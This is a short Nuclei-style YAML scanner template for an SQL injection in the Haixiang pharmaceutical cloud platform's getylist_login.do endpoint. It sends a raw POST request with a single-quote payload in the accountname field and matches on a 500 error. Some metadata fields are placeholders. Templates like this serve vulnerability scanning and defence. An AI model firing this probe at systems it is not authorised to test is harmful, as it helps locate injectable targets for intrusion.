id: hxyy-getylist-sqli
info:
  name: hxyy-getylist-sqli
  author: apple
  severity: high
  description: 成都海翔软件有限公司海翔药业云平台存在 sql 注入
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /getylist_login.do HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Content-Length: 14
        Origin: http://{{Hostname}}
        Connection: close
        Referer: http://{{Hostname}}/
        Cookie: JSESSIONID=4E50F93F7AD3A20B4EFDDA1AB535E4DE; __session:0.9627255702653575:=http:
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

        accountname=1'
    matchers:
      - type: word
        part: header
        words:
          - '500'
